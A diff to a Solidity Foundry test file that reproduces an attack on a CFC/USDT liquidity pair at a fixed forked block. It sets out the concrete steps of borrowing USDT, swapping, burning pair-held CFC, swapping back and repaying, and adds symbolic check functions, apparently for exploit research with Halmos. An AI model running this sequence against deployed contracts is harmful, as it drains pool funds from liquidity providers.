@@ -328,69 +328,41 @@ contract CFCTestBase is Test, BlockLoader {
     }
 
     function test_gt() public {
-        uint256 amt0 = 0x26764a5ae86ba600000;
-        uint256 amt1 = 0x26756c4f7d313000000;
-        uint256 amt2 = 0x7764443d11976c0000;
-        uint256 amt3 = 0x776417c9d130ec0000;
-        uint256 amt4 = 0x83b50e28262a0000000;
-        uint256 amt5 = 0x7d1def2bb1219000000;
-        uint256 amt6 = 0x1d4c13b2e3b02c00000;
-        uint256 amt7 = 0x787dfc48f2690c0000;
-        uint256 amt8 = 0x787dfc48f2690c0000;
-        uint256 amt9 = 0x2693d5bfdce30200000;
-        uint256 amt10 = 0x2693d4e1d177c800000;
-
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
-        vm.assume(amt10 >= amt0);
-        borrow_usdt_owner(amt0);
-        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_pair_attacker_safe_cfc(amt3, amt4);
-        burn_cfc_pair(amt5);
-        swap_pair_attacker_cfc_safe(amt6, amt7);
-        swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
-        payback_usdt_owner(amt10);
-        require(!attackGoal(), "Attack succeed!");
+        emit log_named_uint("amt0", 57 * 1e22);
+        borrow_usdt_owner(57 * 1e22);
+        printBalance("After step0 ");
+        emit log_named_uint("amt1", 13 * 1e21);
+        emit log_named_uint(
+            "amt2",
+            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
+        );
+        swap_usdtcfc_attacker_usdt_cfc(
+            13 * 1e21,
+            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
+        );
+        printBalance("After step1 ");
+        emit log_named_uint("amt3", 36000 ether);
+        burn_cfc_pair(36000 ether);
+        printBalance("After step2 ");
+        emit log_named_uint("amt4", cfc.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
+        );
+        swap_usdtcfc_attacker_cfc_usdt(
+            cfc.balanceOf(attacker),
+            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
+        );
+        printBalance("After step3 ");
+        emit log_named_uint("amt6", 57 * 1e22);
+        payback_usdt_owner(57 * 1e22);
+        printBalance("After step4 ");
+        require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
-
-    // function test_gt() public {
-    //     vm.startPrank(attacker);
-    //     vm.warp(blockTimestamp);
-    //     vm.roll(29668034);
-    //     emit log_named_uint("amt0", 57 * 1e22);
-    //     borrow_usdt_owner(57 * 1e22);
-    //     printBalance("After step0 ");
-    //     emit log_named_uint("amt1", 13 * 1e21);
-    //     emit log_named_uint(
-    //         "amt2",
-    //         safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
-    //     );
-    //     swap_usdtcfc_attacker_usdt_cfc(
-    //         13 * 1e21,
-    //         safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
-    //     );
-    //     printBalance("After step1 ");
-    //     emit log_named_uint("amt3", 36000 ether);
-    //     burn_cfc_pair(36000 ether);
-    //     printBalance("After step2 ");
-    //     emit log_named_uint("amt4", cfc.balanceOf(attacker));
-    //     emit log_named_uint(
-    //         "amt5",
-    //         (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
-    //     );
-    //     swap_usdtcfc_attacker_cfc_usdt(
-    //         cfc.balanceOf(attacker),
-    //         (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
-    //     );
-    //     printBalance("After step3 ");
-    //     emit log_named_uint("amt6", 57 * 1e22);
-    //     payback_usdt_owner(57 * 1e22);
-    //     printBalance("After step4 ");
-    //     require(attackGoal(), "Attack failed!");
-    //     vm.stopPrank();
-    // }
 
     function check_gt(
         uint256 amt0,
@@ -410,7 +382,29 @@ contract CFCTestBase is Test, BlockLoader {
         burn_cfc_pair(amt3);
         swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        require(!attackGoal(), "Attack succeed!");
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
+        vm.assume(amt6 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
+        burn_cfc_pair(amt3);
+        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
+        payback_usdt_owner(amt6);
+        assert(!attackGoal());
         vm.stopPrank();
     }
 }
